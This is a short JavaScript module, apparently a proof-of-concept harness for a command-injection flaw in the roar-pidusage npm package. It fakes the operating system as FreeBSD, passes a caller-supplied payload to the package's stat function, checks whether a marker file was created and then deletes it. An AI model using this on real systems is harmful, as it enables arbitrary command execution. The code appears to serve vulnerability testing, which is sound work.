function exploitFunction(payload) {
  const os = require("os");
  os.platform = () => {
    return "freebsd";
  };
  const roar_pidusage = require("roar-pidusage");
  const fs = require("fs");
  const path = "./roar-pidusage";
  roar_pidusage.stat(payload, function () {
    const file_exist = fs.existsSync(path);
    fs.unlink(path, function (err) {
      if (err) {
        console.error(err);
      }
    });
    return file_exist;
  });
}

module.exports = { exploitFunction };